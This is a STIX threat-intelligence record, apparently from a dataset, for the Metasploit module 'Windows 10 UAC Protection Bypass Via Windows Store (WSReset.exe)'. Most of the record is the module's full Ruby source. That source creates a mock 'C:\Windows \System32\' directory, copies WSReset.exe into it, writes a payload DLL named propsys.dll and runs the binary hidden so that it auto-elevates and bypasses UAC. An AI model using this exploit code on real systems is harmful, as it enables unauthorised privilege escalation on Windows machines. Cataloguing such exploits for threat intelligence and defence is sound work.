{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e1382b7-f528-4e78-bfbb-dde78c36e0f2",
    "created": "2024-08-14T16:49:10.69745Z",
    "modified": "2024-08-14T16:49:10.697454Z",
    "name": "Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)",
    "description": " This module exploits a flaw in the WSReset.exe Windows Store Reset Tool. The tool is run with the \"autoElevate\" property set to true, however it can be moved to a new Windows directory containing a space (C:\\Windows \\System32\\) where, upon execution, it will load our payload dll (propsys.dll).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_windows_store_filesys.rb",
            "external_id": "bypassuac_windows_store_filesys.rb"
        },
        {
            "source_name": "reference",
            "url": "https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sailay1996/UAC_bypass_windows_store"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)',\n        'Description' => %q{\n          This module exploits a flaw in the WSReset.exe Windows Store Reset Tool. The tool\n          is run with the \"autoElevate\" property set to true, however it can be moved to\n          a new Windows directory containing a space (C:\\Windows \\System32\\) where, upon\n          execution, it will load our payload dll (propsys.dll).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'ACTIVELabs', # discovery\n          'sailay1996', # poc\n          'timwr',      # metasploit module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [[ 'Automatic', {} ]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'EXITFUNC' => 'process',\n          'WfsDelay' => 15\n        },\n        'DisclosureDate' => '2019-08-22',\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]\n        },\n        'References' => [\n          ['URL', 'https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html'],\n          ['URL', 'https://github.com/sailay1996/UAC_bypass_windows_store'],\n          ['URL', 'https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e'],\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_file_copy\n              stdapi_fs_mkdir\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number > Msf::WindowsVersion::Win10_InitialRelease && !version.windows_server? && exists?('C:\\\\Windows\\\\System32\\\\WSReset.exe')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    end\n\n    # Make sure we have a sane payload configuration\n    if sysinfo['Architecture'] != payload.arch.first\n      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target')\n    end\n\n    check_permissions!\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    exploit_win_dir = 'C:\\\\Windows \\\\'\n    exploit_dir = 'C:\\\\Windows \\\\System32\\\\'\n    exploit_file = exploit_dir + 'WSReset.exe'\n    unless exists? exploit_win_dir\n      print_status(\"Creating directory '#{exploit_win_dir}'...\")\n      session.fs.dir.mkdir(exploit_win_dir)\n    end\n    unless exists? exploit_dir\n      print_status(\"Creating directory '#{exploit_dir}'...\")\n      session.fs.dir.mkdir(exploit_dir)\n    end\n    unless exists? exploit_file\n      session.fs.file.copy('C:\\\\Windows\\\\System32\\\\WSReset.exe', exploit_file)\n    end\n\n    payload_dll = 'C:\\\\Windows \\\\System32\\\\propsys.dll'\n    print_status(\"Creating payload '#{payload_dll}'...\")\n    payload = generate_payload_dll\n    write_file(payload_dll, payload)\n    print_status('Executing WSReset.exe...')\n    begin\n      session.sys.process.execute(\"cmd.exe /c \\\"#{exploit_file}\\\"\", nil, { 'Hidden' => true })\n    rescue ::Exception => e\n      print_error(e.to_s)\n    end\n    print_warning(\"This exploit requires manual cleanup of the '#{exploit_win_dir}' and '#{exploit_dir}' directories!\")\n  end\n\n  def check_permissions!\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    # Check if you are an admin\n    # is_in_admin_group can be nil, true, or false\n    print_status('UAC is Enabled, checking level...')\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-08-22",
    "x_mitre_platforms": [
        "['win']"
    ]
}